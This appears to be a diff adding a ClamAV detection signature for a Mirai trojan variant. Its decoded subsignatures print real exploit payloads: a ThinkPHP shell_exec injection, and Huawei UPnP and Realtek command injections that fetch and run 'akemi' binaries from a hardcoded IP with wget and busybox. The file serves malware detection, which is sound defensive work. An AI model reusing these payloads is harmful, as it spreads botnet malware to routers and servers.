@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Mirai-7100836-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1)&(2&3&4)
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://185.244.25.122/bins/akemi.x86 -O thonk
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+-g 185.244.25.122 -l /tmp/akemi -r /bins/akemi.mips; /bin/busybox chmod 777 /tmp/akemi; /tmp/akemi huawei; /bin/busybox iptable
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+/bin/busybox wget http://185.244.25.122/wget.sh; chmod +x wget.sh; ./wget.sh
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+s -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+ient>`cd /var; rm -rf nig; wget http://185.244.25.122/bins/akemi.mips -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><
